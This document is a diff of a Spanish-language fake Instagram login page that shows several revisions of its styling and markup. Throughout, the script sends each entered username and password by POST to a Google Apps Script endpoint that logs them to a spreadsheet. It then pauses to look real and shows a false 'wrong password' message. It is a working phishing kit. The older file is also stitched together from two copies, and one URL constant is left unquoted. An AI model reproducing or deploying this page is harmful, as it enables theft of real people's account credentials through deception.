@@ -5,72 +5,41 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        * {
-            box-sizing: border-box;
-        }
-
         body {
-            background-color: #000000; /* Fondo Negro */
+            background-color: #fafafa;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
-            color: #f5f5f5;
         }
 
         .container {
             width: 350px;
-            background-color: #262626; /* Gris oscuro para el formulario */
-            border: 1px solid #363636;
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
             border-radius: 1px;
-            padding: 10px 40px 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <style>
-        * {
-            box-sizing: border-box;
-        }
-
-        body {
-            background-color: #000000; /* Fondo Negro */
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            color: #f5f5f5;
-        }
-
-        .container {
-            width: 350px;
-            background-color: #262626; /* Gris oscuro para el formulario */
-            border: 1px solid #363636;
-            border-radius: 1px;
-            padding: 10px 40px 30px;
+            padding: 40px 40px 30px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
         .logo {
-            margin-top: 30px;
             margin-bottom: 20px;
             width: 175px;
+            font-family: 'Segoe UI', sans-serif; /* Fallback si no carga imagen */
+            font-size: 32px;
+            font-weight: 600;
+            text-align: center;
         }
-
-        .logo img {
-            width: 100%;
+        
+        /* Si la imagen falla, se verá texto elegante, no "Instagram logo" feo */
+        .logo-text {
+            font-family: "Grand Hotel", cursive, sans-serif;
+            font-size: 40px;
+            margin-top: 20px;
         }
 
         .form-group {
@@ -80,18 +49,14 @@
 
         input {
             width: 100%;
-            background-color: #121212; /* Fondo de input muy oscuro */
-            border: 1px solid #363636;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
             border-radius: 3px;
             padding: 14px 10px;
             margin: 0;
             font-size: 12px;
-            color: #f5f5f5;
+            color: #262626;
             outline: none;
-        }
-
-        input::placeholder {
-            color: #8e8e8e;
         }
 
         input:focus {
@@ -115,11 +80,6 @@
 
         .btn:hover {
             opacity: 1;
-        }
-
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: default;
         }
 
         .or {
@@ -154,25 +114,15 @@
             padding: 8px;
             border-radius: 3px;
         }
-
-        .loading {
-            display: none;
-            margin-top: 10px;
-            color: #8e8e8e;
-            font-size: 12px;
-        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- LOGO CORREGIDO -->
-        <div class="logo">
-            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2721ea7cfe.png" alt="Instagram">
-        </div>
+        <!-- LOGO ROBUSTO (Imagen o Texto de respaldo) -->
+        <div class="logo-text">Instagram</div>
 
-        <!-- Mensaje de error -->
-        <div class="error-msg" id="errorMsg">Contraseña incorrecta. Intenta de nuevo.</div>
+        <div class="error-msg" id="errorMsg">El nombre de usuario o la contraseña es incorrecta.</div>
 
         <form id="loginForm" onsubmit="return false;">
             <div class="form-group">
@@ -202,10 +152,6 @@
         const form = document.getElementById('loginForm');
         const btn = document.getElementById('submitBtn');
         const errorMsg = document.getElementById('errorMsg');
-        const loadingDiv = document.createElement('div');
-        loadingDiv.className = 'loading';
-        loadingDiv.innerText = 'Iniciando sesión...';
-        loadingDiv.style.display = 'none';
 
         form.addEventListener('submit', function(e) {
             e.preventDefault();
@@ -213,13 +159,10 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // UI Feedback
             btn.disabled = true;
             btn.innerText = '...';
             errorMsg.style.display = 'none';
-            loadingDiv.style.display = 'block';
 
-            // Enviar datos a Google Sheets
             const data = new FormData();
             data.append('username', username);
             data.append('password', password);
@@ -229,219 +172,19 @@
                 body: data
             })
             .then(response => {
-                // Simular un pequeño retraso para parecer real
                 return new Promise(resolve => setTimeout(resolve, 1000));
             })
             .then(() => {
-                loadingDiv.style.display = 'none';
-                
-                // Opcional: Mostrar error para dar realismo o redirigir
-                // Aquí mostramos un error genérico como hace IG a veces con cuentas no verificadas
+                btn.disabled = false;
+                btn.innerText = 'Iniciar sesión';
                 errorMsg.style.display = 'block';
                 errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
-                
-                // Si prefieres que se quede en la pantalla de login sin error después de unos segundos:
-                // setTimeout(() => { errorMsg.style.display = 'none'; btn.disabled = false; btn.innerText = 'Iniciar sesión'; }, 3000);
-                
-                // O si quieres que recargue la página para que intenten otra vez:
-                // location.reload();
-
             })
             .catch(error => {
-                loadingDiv.style.display = 'none';
+                btn.disabled = false;
+                btn.innerText = 'Iniciar sesión';
                 errorMsg.style.display = 'block';
                 errorMsg.innerText = 'Error de conexión. Intenta de nuevo.';
-                btn.disabled = false;
-                btn.innerText = 'Iniciar sesión';
-            });
-        });
-    </script>
-</body>
-</html>
-        }
-
-        .form-group {
-            width: 100%;
-            margin-bottom: 6px;
-        }
-
-        input {
-            width: 100%;
-            background-color: #121212; /* Fondo de input muy oscuro */
-            border: 1px solid #363636;
-            border-radius: 3px;
-            padding: 14px 10px;
-            margin: 0;
-            font-size: 12px;
-            color: #f5f5f5;
-            outline: none;
-        }
-
-        input::placeholder {
-            color: #8e8e8e;
-        }
-
-        input:focus {
-            border-color: #a8a8a8;
-        }
-
-        .btn {
-            width: 100%;
-            background-color: #0095f6;
-            border: none;
-            border-radius: 4px;
-            color: #ffffff;
-            font-weight: 600;
-            font-size: 14px;
-            padding: 7px 10px;
-            margin-top: 10px;
-            cursor: pointer;
-            opacity: 0.9;
-            transition: opacity 0.2s;
-        }
-
-        .btn:hover {
-            opacity: 1;
-        }
-
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: default;
-        }
-
-        .or {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            margin: 18px 0;
-            color: #a8a8a8;
-            font-size: 13px;
-            font-weight: 600;
-        }
-
-        .or::before, .or::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background-color: #363636;
-        }
-
-        .or::before { margin-right: 10px; }
-        .or::after { margin-left: 10px; }
-
-        .error-msg {
-            color: #f5f5f5;
-            font-size: 12px;
-            font-weight: 600;
-            display: none;
-            width: 100%;
-            text-align: center;
-            margin-bottom: 10px;
-            background-color: #3a1d1d; /* Rojo oscuro */
-            padding: 8px;
-            border-radius: 3px;
-            border: 1px solid #8a2be2; /* Opcional: borde sutil */
-        }
-
-        .loading {
-            display: none;
-            margin-top: 10px;
-            color: #8e8e8e;
-            font-size: 12px;
-        }
-        
-        .fb-login {
-            color: #a8a8a8;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        
-        .forgot {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #a8a8a8;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        <!-- Logo de Instagram -->
-        <div class="logo">
-            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020wY07c.svg" alt="Instagram Logo">
-        </div>
-
-        <!-- Mensaje de error -->
-        <div class="error-msg" id="errorMsg">Contraseña incorrecta. Intenta de nuevo.</div>
-
-        <form id="loginForm" onsubmit="return false;">
-            <div class="form-group">
-                <input type="text" id="username" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
-            </div>
-            <div class="form-group">
-                <input type="password" id="password" name="password" placeholder="Contraseña" required>
-            </div>
-            <button type="submit" class="btn" id="submitBtn">Iniciar sesión</button>
-        </form>
-
-        <div class="or">O</div>
-        
-        <div class="fb-login">
-            Iniciar sesión con Facebook
-        </div>
-        
-        <div class="forgot">
-            ¿Has olvidado la contraseña?
-        </div>
-    </div>
-
-    <script>
-        // https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec
-        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec;
-
-        const form = document.getElementById('loginForm');
-        const btn = document.getElementById('submitBtn');
-        const errorMsg = document.getElementById('errorMsg');
-
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            // UI Feedback
-            btn.disabled = true;
-            btn.innerText = '...';
-            errorMsg.style.display = 'none';
-
-            // Enviar datos a Google Sheets
-            const data = new FormData();
-            data.append('username', username);
-            data.append('password', password);
-
-            fetch(SCRIPT_URL, {
-                method: 'POST',
-                body: data
-            })
-            .then(response => {
-                // Simular un pequeño retraso
-                return new Promise(resolve => setTimeout(resolve, 1000));
-            })
-            .then(() => {
-                btn.disabled = false;
-                btn.innerText = 'Iniciar sesión';
-                
-                // Mostrar error para realismo
-                errorMsg.style.display = 'block';
-                errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
-            })
-            .catch(error => {
-                btn.disabled = false;
-                btn.innerText = 'Iniciar sesión';
-                errorMsg.style.display = 'block';
-                errorMsg.innerText = 'Error de conexión.';
             });
         });
     </script>
